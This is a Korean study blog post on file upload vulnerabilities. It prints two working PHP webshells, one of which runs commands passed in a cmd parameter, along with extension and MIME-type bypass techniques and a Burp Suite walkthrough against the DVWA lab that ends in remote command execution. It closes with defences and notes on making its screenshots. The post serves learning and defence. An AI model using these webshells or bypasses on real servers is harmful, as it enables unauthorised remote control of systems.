---
layout: post
title: "파일 업로드 취약점 공부"
date: 2025-08-28 17:00:00 +0900
categories: [웹 해킹]
---

### 1. 개요

파일 업로드 취약점은 서버 측에서 업로드되는 파일의 확장자나 내용을 제대로 검증하지 않을 때 발생한다. 공격자는 이 취약점을 이용해 악의적인 스크립트 파일(웹쉘)을 서버에 업로드하여 원격에서 시스템 명령어를 실행(RCE)하고 최종적으로 서버의 제어권을 획득할 수 있다.

이 공격은 [A04: 안전하지 않은 설계](https://hamap0.github.io/projects/owasp-top-10/2025/08/28/A04_Insecure-Design.html) 프로젝트 보고서에서 다룬 핵심 주제이다.

---

### 2. 주요 우회 기법

단순히 `.php` 파일을 업로드하는 것은 대부분의 필터링에 막히므로 이를 우회하는 기법이 필요하다.

*   **확장자 필터링 우회:**
    서버가 특정 확장자를 블랙리스트 방식으로 필터링할 때 사용된다. `.php` 대신 `.phtml` · `.php3` · `.inc` 등 웹 서버가 PHP로 해석할 수 있는 다른 확장자를 시도하거나 `shell.pHp`처럼 대소문자를 혼용하여 우회를 시도할 수 있다.

*   **MIME 타입 검증 우회:**
    서버가 파일 확장자 대신 HTTP 요청 헤더의 `Content-Type`을 기준으로 파일 종류를 판단할 때 사용된다. 이 값은 클라이언트가 보내는 정보이므로 Burp Suite와 같은 프록시 툴을 이용해 `Content-Type: application/x-php`를 `Content-Type: image/jpeg`와 같이 정상적인 이미지 파일처럼 조작하여 필터링을 우회할 수 있다.


---

### 3. 웹쉘 (Webshell)

웹쉘은 웹 서버를 통해 시스템 명령어를 실행할 수 있도록 만들어진 스크립트 파일이다.

#### **기본 웹쉘**
가장 단순한 형태의 웹쉘은 URL 파라미터를 통해 전달받은 명령어를 그대로 실행하고 결과를 출력한다. `cmd`라는 파라미터로 명령어를 전달받는 예시이다.
```php
<?php
  if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
  }
?>
```
   ![FileuploadWebshell](/assets/images/FUpload_1.png)

#### **개선된 웹쉘 (간이 파일 브라우저)**
조금 더 발전된 형태의 웹쉘은 단순히 명령어를 실행하는 것을 넘어 서버의 파일 시스템을 탐색하는 기능을 포함할 수 있다. 아래 코드는 `path` 파라미터로 전달된 경로의 파일과 디렉터리 목록을 보여주는 간단한 파일 브라우저 역할을 한다.
```php
<?php
  $path = isset($_GET['path']) ? $_GET['path'] : '.';
  $files = scandir($path);
  
  foreach($files as $file) {
    // 현재 디렉터리(.)와 상위 디렉터리(..) 링크 생성
    if ($file == '.') {
      echo "<a href='?path={$path}'>.</a><br>";
    } elseif ($file == '..') {
      $parent_path = dirname($path);
      echo "<a href='?path={$parent_path}'>..</a><br>";
    } else {
      echo $file . "<br>";
    }
  }
?>
```

---

### 4. 사용 예시: Burp Suite를 이용한 MIME 타입 우회

이 예시는 서버가 `Content-Type` 헤더를 신뢰할 때 발생하는 파일 업로드 취약점을 공격하는 과정을 보여준다.

#### **1. 요청 가로채기 (Intercept)**
1.  `shell.php` 파일을 준비하고 Burp Suite와 브라우저 프록시를 설정한다.
2.  Burp Suite의 `Proxy` > `Intercept` 탭을 `On` 상태로 설정한다.
3.  DVWA의 `File Upload` 페이지에서 `shell.php` 파일을 선택하고 `Upload` 버튼을 클릭하여 요청을 가로챈다.

#### **2. Content-Type 헤더 변조**
1.  가로챈 `POST` 요청 패킷에서 `Content-Type` 헤더를 확인한다. 초기 값은 `application/x-php`로 설정되어 있다.
    ```http
    ...
    Content-Disposition: form-data; name="uploaded"; filename="shell.php"
    Content-Type: application/x-php

    <?php system($_GET['cmd']); ?>
    ...
    ```
2.  `Content-Type: application/x-php` 라인을 `Content-Type: image/jpeg`로 수정한다.
3.  `Forward` 버튼을 눌러 변조된 요청을 서버로 전송한다.

#### **3. 업로드 확인 및 웹쉘 실행**
1.  서버의 필터링 로직이 `Content-Type`만 검증했다면 파일은 정상적으로 업로드되고 저장 경로(예: `../../hackable/uploads/shell.php`)가 출력된다.
2.  브라우저에서 해당 경로에 `?cmd=whoami` 파라미터를 추가하여 접속한다.
3.  화면에 `www-data`가 출력되면 웹쉘 업로드 및 명령어 실행에 성공한 것이다.
   ![FileuploadBurp](/assets/images/Fupload_2.png)

---

### 5. 방어 방안

*   **확장자 화이트리스트:** `.php`, `.jsp` 등 위험한 확장자를 금지하는 블랙리스트 방식 대신 `.jpg` · `.png` · `.gif` 와 같이 허용된 확장자만 업로드할 수 있도록 화이트리스트 방식을 사용해야 한다.
*   **파일 내용 검증:** 확장자나 MIME 타입은 조작될 수 있으므로 `getimagesize()`와 같은 함수를 이용해 파일의 내용이 실제 이미지 데이터인지 검증해야 한다.
*   **업로드 경로 제어:** 업로드된 파일이 저장되는 디렉터리는 웹에서 직접 접근할 수 없는 경로(Web Root 외부)에 위치시키거나 만약 웹에서 접근해야 한다면 해당 디렉터리의 스크립트 실행 권한을 제거해야 한다.

<hr class="short-rule">





### 시각 자료(이미지) 제작을 위한 스크립트

#### **기본 웹쉘 실행 이미지 제작**

1.  (준비) 위 `3. 웹쉘` 섹션의 '기본 웹쉘' 코드를 `shell.php` 파일로 저장합니다.
2.  DVWA의 `File Upload` 페이지를 통해 `shell.php` 파일을 업로드합니다.
3.  업로드가 성공하면 파일이 저장된 경로(예: `/hackable/uploads/shell.php`)가 화면에 표시됩니다.
4.  웹 브라우저에서 해당 경로로 접근하되, URL 끝에 실행할 명령어를 쿼리 스트링으로 추가합니다.
    *   **URL 예시:** `http://192.9.200.11/hackable/uploads/shell.php?cmd=whoami`
5.  브라우저 화면에 명령어의 결과인 `www-data`가 출력될 것입니다.
6.  이 상태의 브라우저 화면 전체를 스크린샷으로 찍습니다.
7.  이미지 편집 프로그램을 사용하여 스크린샷을 엽니다.
8.  두 부분에 하이라이트를 적용하여 원인과 결과를 명확히 보여줍니다.
    *   **원인:** 주소창의 `?cmd=whoami` 부분
    *   **결과:** 페이지 본문에 출력된 `www-data`
9.  수정된 이미지를 저장하여 게시글에 삽입합니다.

#### **MIME 타입 우회 공격 이미지 제작**

1.  **Burp Suite 요청 변조 화면 캡처:**
    *   `4. 사용 예시`의 2단계 과정에서, `Content-Type` 헤더를 `image/jpeg`로 수정한 Burp Suite의 `Proxy` 탭 화면을 스크린샷으로 찍어 **`MIME_Bypass_Request.png`**로 저장한다.
2.  **웹쉘 실행 결과 화면 캡처:**
    *   3단계 과정에서, `whoami` 명령어의 결과(`www-data`)가 출력된 브라우저 화면을 스크린샷으로 찍어 **`MIME_Bypass_Result.png`**로 저장한다.
3.  **최종 이미지 편집:**
    *   이미지 편집 프로그램에서 `MIME_Bypass_Request.png`(왼쪽)와 `MIME_Bypass_Result.png`(오른쪽)를 나란히 배치한다.
    *   왼쪽 이미지에서는 `Content-Type: image/jpeg`로 수정된 라인에 하이라이트를 적용한다.
    *   오른쪽 이미지에서는 주소창의 `...shell.php?cmd=whoami` 부분과 본문의 `www-data` 출력 결과에 하이라이트를 적용한다.
    *   두 이미지 사이에 화살표를 추가하여 왼쪽의 요청 변조가 오른쪽의 RCE 성공으로 이어졌음을 시각적으로 연결한다.
    *   수정된 이미지를 게시글에 삽입한다.